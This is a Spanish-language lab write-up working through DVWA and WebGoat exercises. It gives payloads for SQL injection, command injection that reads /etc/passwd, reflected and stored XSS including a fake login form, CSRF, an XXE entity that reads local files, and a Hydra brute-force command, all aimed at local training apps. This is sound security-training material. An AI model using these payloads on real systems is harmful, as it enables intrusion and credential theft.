= Aplicaciones web

== DVWA

=== SQL Injection

Para detectar la vulnerabilidad, podemos interceptar peticiones con Burpsuite.

.Burpsuite interceptando peticiones, SQL Injection
image::includes/images/sql1.png[Burpsuite interceptando peticiones, SQL Injection]

Analizando la petición interceptada, pensamos que el parámetro _id_ podría ser susceptible a inyecciones SQL. Para verificarlo, añadimos "’" al valor _1_, produciéndose el siguiente error:

.Error SQL Injection
image::includes/images/sql2.png[Error SQL Injection]

Estos son algunos payloads que pueden ser probados:
Con lo que podremos utilizar el siguiente payload para ver el tipo de Base de datos que tenemos

[source]
----
// Comprobar tipo de base de datos
0 UNION SELECT database(), null

// Listar usuarios y contraseñas
0 UNION SELECT user,password from dvwa.users
----

Al probarlos, obtenemos la siguiente información:

.Resultados SQL Injection
image::includes/images/sql3.png[Resultados SQL Injection]

=== SQL Injection (Blind)

Interceptamos otra petición:

.Burpsuite interceptando peticiones, SQL Injection (Blind)
image::includes/images/sql4.png[Burpsuite interceptando peticiones, SQL Injection (Blind)]

Inyectamos el siguiente código:

[source]
----
1 OR 0=0--
----

La consulta nos devuelve el siguiente listado:

.Resultados SQL Injection (Blind)
image::includes/images/sql5.png[Resultados SQL Injection (Blind)]

=== Command Injection

Como podemos observar, esta página permite lanzar pings, en Linux podemos concatenar comandos con los símbolos &, &&, ||, ;.

Para verificar si es vulnerable a inyección de comandos, lanzamos el siguiente payload:

[source]
----
|| cat /etc/passwd
----

.Resultados Command Injection
image::includes/images/sql6.png[Resultados Command Injection]

Mediante inyección de comandos, podríamos obtener acceso a la máquina, inyectando claves RSA para SSH y arrancando un servidor SSH, por ejemplo.


=== XSS (Reflected)

Podemos aprovechar la vulnerabilidad creando un formulario de inicio de sesión falso:

[source]
----
<form action="login.php" method=”GET”>
Usuario<br>
<input name="usuario" type="text"><br>
Contraseña <br>
<input name="password" type="password"><br>
<br>
<input value="Acceder" name="Acceder" type="submit">
</form>
----

.Resultados XSS (Reflected)
image::includes/images/sql7.png[Resultados XSS (Reflected)]

=== XSS (Stored)

El parámetro mtxMessage es vulnerable:

[source]
----
<script>alert(“PAYLOAD”)</script >
----

.Resultados XSS (Stored)
image::includes/images/sql8.png[Resultados XSS (Stored)]


=== Brute Force

Una vez interceptado el tráfico con Burpsuite, realizamos un ataque a la fuerza bruta mediante Hydra y el diccionario Rockyou:

[source]
----
$ hydra -l admin -P /usr/share/wordlist/rockyou.txt 127.0.0.1 http-get-form
"/vulnerabilities/brute/index.php:username=^USER^&password=^PASS^&Login=Login:Usern
ame and/or password incorrect.:H=Cookie: security=low;
PHPSESSID=hj8kbad41h3fi6q52j9vqgsqq5"
----

.Resultados Brute Force
image::includes/images/sql9.png[Resultados Brute Force]

== WebGoat

=== SQL Injection

[source]
----
';SELECT * FROM user_system_data;--
----

.Resultados SQL Injection
image::includes/images/goat1.png[Resultados SQL Injection]

=== CSRF

[source]
----
<form accept-charset="UNKNOWN" id="basic-csrf-get" method="POST" name="form1" target="_blank" successcallback="" action="http://localhost:8080/WebGoat/csrf/basic-get-flag">
    <input name="csrf" type="hidden" value="false">
    <input type="submit" name="submit">
</form>
----

.Resultados CSRF
image::includes/images/goat2.png[Resultados CSRF]

=== XXE

Interceptamos el tráfico y lo sustituimos por:

[source]
----
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///">]>
<comment><text>&xxe;</text></comment>
----

=== JWT tokens

Analizando el token, podemos observar que está codificado en base64, lo que supone una medida de seguridad insuficiente:

.Token JWT codificado
[source]
----
eyJhbGciOiJIUzI1NiJ9.ew0KICAiYXV0aG9yaXRpZXMiIDogWyAiUk9MRV9BRE1JTiIsICJST0xFX1VTRVIiIF0sDQogICJjbGllbnRfaWQiIDogIm15LWNsaWVudC13aXRoLXNlY3JldCIsDQogICJleHAiIDogMTYwNzA5OTYwOCwNCiAgImp0aSIgOiAiOWJjOTJhNDQtMGIxYS00YzVlLWJlNzAtZGE1MjA3NWI5YTg0IiwNCiAgInNjb3BlIiA6IFsgInJlYWQiLCAid3JpdGUiIF0sDQogICJ1c2VyX25hbWUiIDogInVzZXIiDQp9.9lYaULTuoIDJ86-zKDSntJQyHPpJ2mZAbnWRfel99iI
----

.Token JWT descodificado
[source]
----
{
  "alg": "HS256"
},
{
  "authorities": [
    "ROLE_ADMIN",
    "ROLE_USER"
  ],
  "client_id": "my-client-with-secret",
  "exp": 1607099608,
  "jti": "9bc92a44-0b1a-4c5e-be70-da52075b9a84",
  "scope": [
    "read",
    "write"
  ],
  "user_name": "user"
}
----
